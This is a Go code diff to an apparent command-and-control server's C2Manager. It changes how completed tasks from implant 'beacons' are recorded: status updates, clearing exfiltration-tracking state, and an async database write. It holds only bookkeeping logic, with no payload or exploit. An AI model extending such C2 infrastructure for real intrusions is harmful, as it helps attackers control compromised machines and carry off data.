@@ -1586,18 +1586,41 @@ func (c2 *C2Manager) flushResultBatch(batch []ResultChunk, taskID string, master
 		}
 	}
 
-	// If task is complete, clear from beacon's current task
+	// If task is complete, update local state
 	if lastComplete {
+		beaconID := batch[0].BeaconID
 		c2.mutex.Lock()
-		if beacon, exists := c2.beacons[batch[0].BeaconID]; exists {
+
+		// Update task status to completed
+		if task, exists := c2.tasks[taskID]; exists {
+			task.Status = "completed"
+			if c2.debug {
+				logf("[C2] Task %s marked as completed (Master confirmed)", taskID)
+			}
+		}
+
+		// Clear ExpectedResult (exfiltration finished)
+		delete(c2.expectedResults, taskID)
+
+		// Clear from beacon's current task
+		if beacon, exists := c2.beacons[beaconID]; exists {
 			if beacon.CurrentTask == taskID {
 				beacon.CurrentTask = ""
 				if c2.debug {
-					logf("[C2] Task %s completed (batch flush), cleared from beacon %s CurrentTask", taskID, batch[0].BeaconID)
+					logf("[C2] Task %s completed, cleared from beacon %s CurrentTask", taskID, beaconID)
 				}
 			}
 		}
 		c2.mutex.Unlock()
+
+		// Update database (async)
+		if c2.db != nil {
+			go func(tid string) {
+				if err := c2.db.UpdateTaskStatus(tid, "completed"); err != nil && c2.debug {
+					logf("[C2] Failed to update task status in database: %v", err)
+				}
+			}(taskID)
+		}
 	}
 }
 
